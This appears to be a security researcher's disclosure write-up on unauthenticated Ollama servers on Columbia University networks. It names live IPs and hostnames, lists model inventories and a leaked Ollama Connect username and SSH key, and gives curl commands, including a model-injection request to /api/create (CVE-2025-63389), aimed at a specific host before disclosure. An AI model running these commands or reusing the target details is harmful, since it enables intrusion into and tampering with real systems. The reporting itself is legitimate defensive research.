# Columbia University: Unauthenticated Ollama + Cloud Proxy Credential Leak

_NuClide Research · 2026-05-01_

---

## Summary

Columbia University server running Open WebUI v0.8.12 (auth enabled) with raw Ollama API (port 11434) exposed to the public internet. One active cloud proxy subscription (DeepSeek) accessible without authentication. Cloud proxy 401 response leaks Ollama Connect username and SSH public key.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 128.59.106.97 |
| rDNS | dyn-128-59-106-97.dyn.columbia.edu |
| Org | Columbia University |
| Country | US, New York |
| Open ports | 3000 (Open WebUI), 11434 (Ollama, **public**) |

---

## Models

| Model | Size | Type |
|---|---|---|
| deepseek-v4-pro:cloud | 0 GB | ☁️ Cloud proxy, DeepSeek API |
| qwen2.5:7b | 4 GB | Local |
| qwen2.5:32b-instruct-q4_K_M | 18 GB | Local |
| qwen2.5:14b | 8 GB | Local |
| qwen2.5:14b-instruct-q4_K_M | 8 GB | Local |
| llama3.2-vision:latest | 7 GB | Local |

---

## Findings

### F1: Unauthenticated Ollama API (CRITICAL)

Open WebUI auth on port 3000 does not protect raw Ollama port 11434.

```bash
curl http://128.59.106.97:11434/api/tags          # model list - no auth
curl http://128.59.106.97:11434/api/show -d '{"model":"qwen2.5:32b-instruct-q4_K_M"}'
# model injection (CVE-2025-63389):
curl -X POST http://128.59.106.97:11434/api/create \
  -d '{"model":"qwen2.5:7b","from":"qwen2.5:7b","system":"[attacker prompt]"}'
```

### F2: Cloud Proxy Credential Leak (HIGH)

DeepSeek cloud proxy returns 401 with Ollama Connect credentials in response body:

```json
{
  "error": "unauthorized",
  "signin_url": "https://ollama.com/connect?name=seascvn066&key=<base64>"
}
```

Decoded:
- **Username:** `seascvn066`
- **SSH pubkey:** `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMgKyjVvSEr13H03652CBNEckNUiTj/xgh8i5vKcxO4`

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

---

## Node: Lamont-Doherty Earth Observatory (129.236.163.69)

`dyn-129-236-163-69.dyn.columbia.edu`, Columbia's Lamont-Doherty Earth Observatory (LDEO), Palisades NY. RAG pipeline: `nomic-embed-text:latest` + `llama3.2:latest`. Unauthenticated, CVE-2025-63389 injectable. LDEO conducts geoscience, ocean, and climate research, documents indexed in the RAG pipeline (research datasets, lab notebooks, model outputs) are accessible without authentication.

| Node | IP | Hostname | Notes |
|---|---|---|---|
| Main campus | 128.59.106.97 | dyn-128-59-106-97.dyn.columbia.edu | DeepSeek cloud, 5 local models, cred leak |
| Lamont-Doherty EO | 129.236.163.69 | dyn-129-236-163-69.dyn.columbia.edu | RAG pipeline (nomic-embed-text + llama3.2) |

---

## Disclosure

- **Discovered:** 2026-05-01 (main) / 2026-05-03 (LDEO node)
- **Status:** Pending outreach to Columbia IT Security

---

## Third host (2026-05-19 .edu sweep, via visorgoose): `dyn-128-59-233-10.dyn.columbia.edu`

A third Columbia DHCP-network host surfaced during the 2026-05-19 visorgoose `.edu` scan (after the G8 fix unlocked `.edu` TLD support in the tool).

### Infrastructure

| Field | Value |
|---|---|
| IP | 128.59.233.10 |
| rDNS | `dyn-128-59-233-10.dyn.columbia.edu` (Columbia DHCP main-campus pattern, same as Main entry above) |
| Org | Columbia University |
| Service | Ollama on port 11434 |
| Ollama version | 0.24.0 |

### Observations

`GET http://128.59.233.10:11434/api/version` returned 200 with `{"version":"0.24.0"}` — recent Ollama release.

`GET .../api/tags` returned 200 with 1,005 bytes containing 3 models:

| Model | Notes |
|---|---|
| `gemma4:e4b-it-q4_K_M` | Google Gemma 4 (4B parameter, instruction-tuned, q4_K_M quant) |
| `smollm2:135m` | HuggingFace SmolLM2 with default HF system prompt `"You are a helpful AI assistant named SmolLM, trained by Hugging Face"` (per visorgoose's `/api/show` enumeration) |
| `gemma3:1b` | Google Gemma 3 (1B) |

`GET .../api/ps` returned `{"models":[]}` — no model currently loaded in resident memory.

### Class memberships observed

- Public unauth Ollama API class — OBSERVED (`/api/version` returns 200; no auth header required)
- Small local-models inventory class — OBSERVED (3 models, all under 5GB — consistent with a personal-laptop or low-end VM deployment, not a research-compute host)
- Default-HF-system-prompt class — OBSERVED on `smollm2:135m` (user did not customize the model prompt — typical of casual `ollama pull` + `ollama run` use, not production deployment)
- CVE-2025-63389 applicability — Ollama 0.24.0 is in a version range that may have received the `/api/create` patch upstream; not data-verified per restraint (would require POST to `/api/create`).

### Notable details — Columbia DHCP pattern

This is the THIRD Columbia-attributed host in the NuClide ledger to fit the `dyn-*-dyn.columbia.edu` DHCP naming convention. The pattern:

| Host | IP | Caught when | Service |
|---|---|---|---|
| `dyn-128-59-106-97.dyn.columbia.edu` | 128.59.106.97 | 2026-05-01 (above) | Open WebUI auth-on + Ollama public + cloud-proxy cred-leak |
| `dyn-129-236-163-69.dyn.columbia.edu` | 129.236.163.69 | 2026-05-03 (LDEO above) | Ollama public with RAG pipeline (nomic-embed + llama3.2) |
| `dyn-128-59-233-10.dyn.columbia.edu` | 128.59.233.10 | 2026-05-19 (this entry, via visorgoose .edu scan) | Ollama 0.24.0 public, 3 small models, no system prompt customization |

The `dyn-*.dyn.columbia.edu` hostname convention is Columbia's DHCP-assigned-IP pattern (each octet of the IP is embedded in the hostname). This means:
- Hosts rotate with their DHCP leases
- Each "host" identified here is actually a current assignment of that IP to a device; the device may move and get a different IP, freeing this one for another device
- Cross-time tracking of "the same Columbia user" requires correlating hostname patterns + behavior, not relying on IP/hostname continuity

This is the same operational class as DePaul's `eduroam-*` and Virginia Tech's `dhcp.vt.edu` hosts (see `IL-depaul.md`, `VA-vt.md`). Columbia's DHCP-network exposure is similar in shape but appears in the `dyn-*` pattern instead of `eduroam-*` / `dhcp-*`.

### Cross-tool confirmations

- visorgoose `--tld .edu` scan — surfaced with 3-model inventory tag, no CLOUD tag, no TAKEOVER tag
- Direct `/api/version` + `/api/tags` + `/api/ps` probes — verified Ollama 0.24.0 live, 3-model inventory, no resident memory load

### Class-membership summary (no tier labels per survey convention)

- Public unauth Ollama on Columbia DHCP host — OBSERVED (third instance in ledger)
- Small-local-models personal-deployment pattern — OBSERVED
- Default HuggingFace system prompt — OBSERVED on `smollm2:135m`

Data-membership (account creation, model invocation, conversation history) not tested per restraint ethic.

### Source artifacts

- visorgoose state: `~/recon/edu-llm-infra-2026-05-19/stage2-wave2/visorgoose-edu-state.json` (Columbia-dyn entry)
- visorgoose report: `~/recon/edu-llm-infra-2026-05-19/stage2-wave2/visorgoose-edu-report.md`
- Direct probe: `~/recon/edu-llm-infra-2026-05-19/stage2-wave2/vg-priority-direct-probe.json` (Columbia-dyn section)
